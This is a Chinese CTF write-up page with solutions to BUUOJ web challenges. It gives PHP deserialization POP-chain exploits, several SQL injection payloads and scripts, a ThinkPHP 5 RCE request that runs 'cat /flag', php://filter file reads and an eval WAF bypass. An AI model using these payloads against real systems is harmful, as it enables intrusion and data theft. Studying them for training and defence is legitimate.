<h4 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h4><p>F12，直接看到 flag.php，进去改XFF，127.0.0.1.</p>
<h4 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line">&lt;?php</span><br><span class="line">//flag is in flag.php</span><br><span class="line">//WTF IS THIS?</span><br><span class="line">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><br><span class="line">//And Crack It!</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file=&#x27;index.php&#x27;)&#123;</span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line">        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker&quot;;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;pop&#x27;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#x27;pop&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">    $a=new Show;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>反序列化，POP链构造。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var = &#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">        // -1   var = flag.php</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;str-&gt;source;</span><br><span class="line">        // -4 str = Test</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker&quot;;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p ;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        return $function();</span><br><span class="line">        // -2   p = Modifier</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$s1 = new Show();</span><br><span class="line">$s2 = new Show();</span><br><span class="line">$s1-&gt;source = $s2;</span><br><span class="line">$s2-&gt;str = new Test();</span><br><span class="line">$s2-&gt;str-&gt;p = new Modifier();</span><br><span class="line">echo urlencode(serialize($s1));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li> 触发 Show 的 toString 方法，需要一个 Show 对象（s1）的 source 是另一个 Show 对象。调用顺序<code>$s1-&gt;__wakeup</code>，<code>$s1-&gt;source-&gt;__toString()</code></li>
<li>触发 Test 的 get 方法，可以把 s2 的 str 属性设置为一个 Test 对象，Show 的 toString 方法访问了 source 属性，而 Test 类不存在这个属性，可以触发。调用顺序<code>$s2-&gt;str-&gt;source</code>，<code>$s2-&gt;str-&gt;__get()</code>。</li>
<li>触发 Modifier 的 invoke 方法，在 Test 类中可以将 p 设置为 Modifier 的对象，可以触发。同时将 Modifier 的 var 变量设置为伪协议读取 flag.php。调用顺序<code>$s2-&gt;str-&gt;p()</code>，<code>$s2-&gt;str-&gt;p-&gt;__invoke()</code>。</li>
</ul>
<p>最后的 urlencode 是必须的</p>
<h4 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h4><p>反序列化</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;a = -1;</span><br><span class="line">        $this-&gt;b = &quot;phpinfo&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $a = $this-&gt;a;</span><br><span class="line">        $b = $this-&gt;b;</span><br><span class="line">        echo $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$s = new HelloPhp();</span><br><span class="line">echo serialize($s);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>phpinfo 可以接受参数，-1 表示显示所有信息，flag 在 phpinfo 中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time.php?data=O:8:%22HelloPhp%22:2:&#123;s:1:%22a%22;i:-1;s:1:%22b%22;s:7:%22phpinfo%22;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h4><p>题目提示有备份，下载<a target="_blank" rel="noopener" href="http://www.zip./">www.zip。</a></p>
<p>根据<code>class.php</code>，我们需要传入一个Name对象，username是admin，password是100，同时还要绕过wakeup方法。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username;</span><br><span class="line">    private $password;</span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$f = new Name(&#x27;admin&#x27;,100);</span><br><span class="line">echo serialize($f);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>得到序列化后的字符串<code>O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</code>，其中username和password都是private的变量，Name前后各有一个空字符，所以长度为14。为了绕过wakeup，将<code>O:4:&quot;Name&quot;:2</code>后面的2改为3（当说明的变量数大于实际变量数可以绕过wakeup方法）。</p>
<p>由于含有空字符，使用python发送请求。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &#x27;http://54603761-44c7-4fe6-81de-add413bc8939.node3.buuoj.cn/&#x27;</span><br><span class="line">params = &#123;&#x27;select&#x27;: &#x27;O:4:&quot;Name&quot;:3:&#123;s:14:&quot;\0Name\0username&quot;;s:5:&quot;admin&quot;;s:14:&quot;\0Name\0password&quot;;i:100;&#125;&#x27;&#125;</span><br><span class="line">r = requests.get(url, params=params)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

<h4 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h4><p>源代码里看到<code>Secret.php</code>，根据提示改一下referer,xff和useragent</p>
<h4 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h4><p>用菜刀或者蚁剑连一下，flag在根目录</p>
<h4 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h4><p><code>admin&#39; or 1=1 #</code></p>
<h4 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h4><p>过滤了 ascii, substr, by, =, &gt;,  union, and, *。</p>
<p>报错注入，用 updatexml，用like代替=，<code>?username=admin%27or(updatexml(1,concat(0x7e,(select(password)from(H4rDsq1)),0x7e),1))%23&amp;password=123</code>，<code>?username=admin%27or(updatexml(1,concat(0x7e,(select(right(password,30))from(H4rDsq1)),0x7e),1))%23&amp;password=123</code>。</p>
<h4 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h4><p>查看源代码，发现一个<code>Archive_room.php</code>，点Secret，提示回去再看看。</p>
<p>抓包，发现<code>secr3t.php</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $file=$_GET[&#x27;file&#x27;];</span><br><span class="line">    if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">        echo &quot;Oh no!&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    include($file); </span><br><span class="line">//flag放在了flag.php里</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>file=flag.php，提示我就在这里但你看不到。file=php://filter/read=convert.base64-encode/resource=flag.php，base64解密，得到flag</p>
<h4 id="强网杯-随便注"><a href="#强网杯-随便注" class="headerlink" title="[强网杯] 随便注"></a>[强网杯] 随便注</h4><p>输入引号，报错</p>
<p><code>1&#39; or 1=1#</code>，查询出所有内容</p>
<p><code>0&#39; union select database()#</code>，得到waf：<code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></p>
<p>尝试堆叠注入，用char绕过waf</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload = &quot;0&#x27;;set @s=concat(%s);PREPARE a FROM @s;EXECUTE a;&quot;</span><br><span class="line">exp = &#x27;select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()&#x27;</span><br><span class="line"># 查表名</span><br><span class="line"># exp = &quot;select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=&#x27;1919810931114514&#x27;&quot;</span><br><span class="line"># 查列名</span><br><span class="line"># exp = &quot;select flag from `1919810931114514`&quot;</span><br><span class="line"># 查flag，表名要使用反引号</span><br><span class="line">res = &#x27;&#x27;</span><br><span class="line">for i in exp:</span><br><span class="line">	res += &quot;char(%s),&quot;%(ord(i))</span><br><span class="line">my_payload = payload%(res[:-1])</span><br><span class="line">print my_payload</span><br></pre></td></tr></table></figure>

<p>得到类似下面的结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;;set @s=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(103),char(114),char(111),char(117),char(112),char(95),char(99),char(111),char(110),char(99),char(97),char(116),char(40),char(84),char(65),char(66),char(76),char(69),char(95),char(78),char(65),char(77),char(69),char(41),char(32),char(102),char(114),char(111),char(109),char(32),char(105),char(110),char(102),char(111),char(114),char(109),char(97),char(116),char(105),char(111),char(110),char(95),char(115),char(99),char(104),char(101),char(109),char(97),char(46),char(84),char(65),char(66),char(76),char(69),char(83),char(32),char(119),char(104),char(101),char(114),char(101),char(32),char(84),char(65),char(66),char(76),char(69),char(95),char(83),char(67),char(72),char(69),char(77),char(65),char(61),char(100),char(97),char(116),char(97),char(98),char(97),char(115),char(101),char(40),char(41));PREPARE a FROM @s;EXECUTE a;</span><br></pre></td></tr></table></figure>

<p>也可以交换1919810931114514和words两个表的名字，这样正常查询就可以得到1919810931114514表里的内容</p>
<h4 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h4><p>注入点在点击按钮出现的 <code>search.php/id=1</code> 中，用异或符号进行盲注。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;http://4e80936d-618a-4d1b-8913-910f41a86c5f.node3.buuoj.cn/search.php&quot;</span><br><span class="line">for i in range(1,20):</span><br><span class="line">    for j in range(1,128):</span><br><span class="line">        d =&quot;?id=1^(ascii(substr((select(group_concat(password))from(F1naI1y)),&#x27;&quot;+str(i)+&quot;&#x27;,1))=&#x27;&quot;+str(j)+&quot;&#x27;)^1&quot;</span><br><span class="line">        r = requests.get(url+d)</span><br><span class="line">        if &#x27;Click&#x27; in r.text:</span><br><span class="line">            print(chr(j))</span><br></pre></td></tr></table></figure>

<h4 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h4><p>Java的站，点help看到<code>filename=help.docx</code>，可能存在文件包含。</p>
<p>java应用的安全目录是<code>WEB-INF</code>，访问其中的文件要通过 web.xml 进行相应映射才能访问。包括：</p>
<ul>
<li><code>WEB-INF/web.xml</code>，Web应用配置文件，描述servlet和其他应用组件配置及命名规则。</li>
<li><code>WEB-INF/classes/</code>，包含站点所有用的class文件，包括 servlet class 和非servlet class，不能包含在 .jar 文件中。</li>
<li><code>WEB-INF/lib/</code>，存放web应用需要的 jar 文件，放置仅在这个应用中要求使用的 .jar 文件，例如数据库驱动 jar文件。</li>
<li><code>WEB-INF/src/</code>，源码目录，按包结构放置各个 java 文件。</li>
<li><code>WEB-INF/database.properties</code>，数据库配置文件。</li>
</ul>
<p>访问<code>WEB-INF/web.xml</code>，用POST方法？，可以看到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">       &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;</span><br><span class="line">       &lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;</span><br><span class="line">   &lt;/servlet&gt;</span><br></pre></td></tr></table></figure>

<p>访问这个 class 文件，<code>WEB-INF/classes/com/wm/ctf/FlagController.class</code>，可以看到一串 base64，解码得到flag。</p>
<h4 id="BJDCTF2020-Old-Hack"><a href="#BJDCTF2020-Old-Hack" class="headerlink" title="[BJDCTF2020]Old Hack"></a>[BJDCTF2020]Old Hack</h4><p>ThinkPHP 5 的RCE，直接上，<code>?s=captcha</code>，POST传<code>_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=cat /flag</code></p>
<h4 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h4><p>看响应头里有<code>Hint: select * from &#39;admin&#39; where password=md5($pass,true)</code>，true是返回的十六进制MD5转化为字符串，输入<code>ffifdyop</code>，这个字符串转化之后是<code>&#39;or&#39;6....</code>。</p>
<p>然后是弱类型，传数组就可以<code>a[]=1&amp;b[]=2</code>。</p>
<p>然后是强类型，用 fastcoll，先生成两个md5值一样的文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fastcoll_v1.0.0.5.exe source.txt</span><br></pre></td></tr></table></figure>

<p>读取文件的时候要用二进制格式，因为含有文本格式解码不了的字符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &#x27;http://337b4ffe-e9cf-4213-a211-e49ab794d636.node3.buuoj.cn/levell14.php&#x27;</span><br><span class="line">with open(&#x27;./1.txt&#x27;, &#x27;rb&#x27;) as f1:</span><br><span class="line">    with open(&#x27;./2.txt&#x27;, &#x27;rb&#x27;) as f2:</span><br><span class="line">        t1 = f1.read()</span><br><span class="line">        t2 = f2.read()</span><br><span class="line">        data = &#123;&#x27;param1&#x27;: t1,&#x27;param2&#x27;: t2&#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        print(r.text)</span><br></pre></td></tr></table></figure>

<h4 id="BJDCTF-2nd-假猪套天下第一"><a href="#BJDCTF-2nd-假猪套天下第一" class="headerlink" title="[BJDCTF 2nd]假猪套天下第一"></a>[BJDCTF 2nd]假猪套天下第一</h4><p>随便输一个用户名和密码，看到提示<code>L0g1n.php</code>，在里面看到要99年后访问。在Cookie的 time 里改一个很大的数字，提示要从本地访问。<code>X-Forwarded-For</code>不行，换一个<code>Client-ip</code>。要从<code>gem-love.com</code>访问，改<code>Referer</code>。要从<code>Commodo 64</code>访问，查一下完整的 UA，是<code>Commodore 64</code>。要求邮箱，用<code>From</code>头。需要代理，用<code>Via</code>头。</p>
<table>
<thead>
<tr>
<th>Header</th>
<th>解释</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>Accept</td>
<td>指定客户端能够接收的内容类型</td>
<td>Accept: text/plain, text/html,application/json</td>
</tr>
<tr>
<td>Accept-Charset</td>
<td>浏览器可以接受的字符编码集。</td>
<td>Accept-Charset: iso-8859-5</td>
</tr>
<tr>
<td>Accept-Encoding</td>
<td>指定浏览器可以支持的web服务器返回内容压缩编码类型。</td>
<td>Accept-Encoding: compress, gzip</td>
</tr>
<tr>
<td>Accept-Language</td>
<td>浏览器可接受的语言</td>
<td>Accept-Language: en,zh</td>
</tr>
<tr>
<td>Accept-Ranges</td>
<td>可以请求网页实体的一个或者多个子范围字段</td>
<td>Accept-Ranges: bytes</td>
</tr>
<tr>
<td>Authorization</td>
<td>HTTP授权的授权证书</td>
<td>Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</td>
</tr>
<tr>
<td>Cache-Control</td>
<td>指定请求和响应遵循的缓存机制</td>
<td>Cache-Control: no-cache</td>
</tr>
<tr>
<td>Connection</td>
<td>表示是否需要持久连接。（HTTP 1.1默认进行持久连接）</td>
<td>Connection: close</td>
</tr>
<tr>
<td>Cookie</td>
<td>HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器。</td>
<td>Cookie: $Version=1; Skin=new;</td>
</tr>
<tr>
<td>Content-Length</td>
<td>请求的内容长度</td>
<td>Content-Length: 348</td>
</tr>
<tr>
<td>Content-Type</td>
<td>请求的与实体对应的MIME信息</td>
<td>Content-Type: application/x-www-form-urlencoded</td>
</tr>
<tr>
<td>Date</td>
<td>请求发送的日期和时间</td>
<td>Date: Tue, 15 Nov 2010 08:12:31 GMT</td>
</tr>
<tr>
<td>Expect</td>
<td>请求的特定的服务器行为</td>
<td>Expect: 100-continue</td>
</tr>
<tr>
<td>From</td>
<td>发出请求的用户的Email</td>
<td>From: <a href="mailto:&#x75;&#x73;&#101;&#114;&#64;&#101;&#x6d;&#x61;&#x69;&#108;&#46;&#x63;&#x6f;&#109;">&#x75;&#x73;&#101;&#114;&#64;&#101;&#x6d;&#x61;&#x69;&#108;&#46;&#x63;&#x6f;&#109;</a></td>
</tr>
<tr>
<td>Host</td>
<td>指定请求的服务器的域名和端口号</td>
<td>Host: <a target="_blank" rel="noopener" href="http://www.zcmhi.com/">www.zcmhi.com</a></td>
</tr>
<tr>
<td>If-Match</td>
<td>只有请求内容与实体相匹配才有效</td>
<td>If-Match: “737060cd8c284d8af7ad3082f209582d”</td>
</tr>
<tr>
<td>If-Modified-Since</td>
<td>如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回304代码</td>
<td>If-Modified-Since: Sat, 29 Oct 2010 19:43:31 GMT</td>
</tr>
<tr>
<td>If-None-Match</td>
<td>如果内容未改变返回304代码，参数为服务器先前发送的Etag，与服务器回应的Etag比较判断是否改变</td>
<td>If-None-Match: “737060cd8c284d8af7ad3082f209582d”</td>
</tr>
<tr>
<td>If-Range</td>
<td>如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。参数也为Etag</td>
<td>If-Range: “737060cd8c284d8af7ad3082f209582d”</td>
</tr>
<tr>
<td>If-Unmodified-Since</td>
<td>只在实体在指定时间之后未被修改才请求成功</td>
<td>If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT</td>
</tr>
<tr>
<td>Max-Forwards</td>
<td>限制信息通过代理和网关传送的时间</td>
<td>Max-Forwards: 10</td>
</tr>
<tr>
<td>Pragma</td>
<td>用来包含实现特定的指令</td>
<td>Pragma: no-cache</td>
</tr>
<tr>
<td>Proxy-Authorization</td>
<td>连接到代理的授权证书</td>
<td>Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</td>
</tr>
<tr>
<td>Range</td>
<td>只请求实体的一部分，指定范围</td>
<td>Range: bytes=500-999</td>
</tr>
<tr>
<td>Referer</td>
<td>先前网页的地址，当前请求网页紧随其后,即来路</td>
<td>Referer: <a target="_blank" rel="noopener" href="http://www.zcmhi.com/archives/71.html">http://www.zcmhi.com/archives…</a></td>
</tr>
<tr>
<td>TE</td>
<td>客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息</td>
<td>TE: trailers,deflate;q=0.5</td>
</tr>
<tr>
<td>Upgrade</td>
<td>向服务器指定某种传输协议以便服务器进行转换（如果支持）</td>
<td>Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11</td>
</tr>
<tr>
<td>User-Agent</td>
<td>User-Agent的内容包含发出请求的用户信息</td>
<td>User-Agent: Mozilla/5.0 (Linux; X11)</td>
</tr>
<tr>
<td>Via</td>
<td>通知中间网关或代理服务器地址，通信协议</td>
<td>Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)</td>
</tr>
<tr>
<td>Warning</td>
<td>关于消息实体的警告信息</td>
<td>Warn: 199 Miscellaneous warning</td>
</tr>
</tbody></table>
<h4 id="RoarCTF-easy-calc"><a href="#RoarCTF-easy-calc" class="headerlink" title="[RoarCTF] easy calc"></a>[RoarCTF] easy calc</h4><p>提示加了waf，看一下calc.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">if(!isset($_GET[&#x27;num&#x27;]))&#123; </span><br><span class="line">    show_source(__FILE__); </span><br><span class="line">&#125;else&#123; </span><br><span class="line">        $str = $_GET[&#x27;num&#x27;]; </span><br><span class="line">        $blacklist = [&#x27; &#x27;, &#x27;\t&#x27;, &#x27;\r&#x27;, &#x27;\n&#x27;,&#x27;\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\[&#x27;, &#x27;\]&#x27;,&#x27;\$&#x27;,&#x27;\\&#x27;,&#x27;\^&#x27;]; </span><br><span class="line">        foreach ($blacklist as $blackitem) &#123; </span><br><span class="line">                if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $str)) &#123; </span><br><span class="line">                        die(&quot;what are you want to do?&quot;); </span><br><span class="line">                &#125; </span><br><span class="line">        &#125; </span><br><span class="line">        eval(&#x27;echo &#x27;.$str.&#x27;;&#x27;); </span><br><span class="line">&#125; </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p>num只允许输入数字和一些符号，把查询字符串<code>?num=</code>改为<code>?%20num</code>可以绕过，而且在calc.php处理时是一样的，原理是<code>$_GET</code>和<code>$_POST</code>解析字符串的问题，可以用来bypass。</p>
<p>接下来只需要绕过引号</p>
<p><code>?%20num=var_dump(scandir(chr(47)))</code></p>
<p>列出当前目录下的文件，可以看到f1agg，读一下这个文件</p>
<p><code>?%20num=var_dump(file(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p>
<p>得到flag</p>
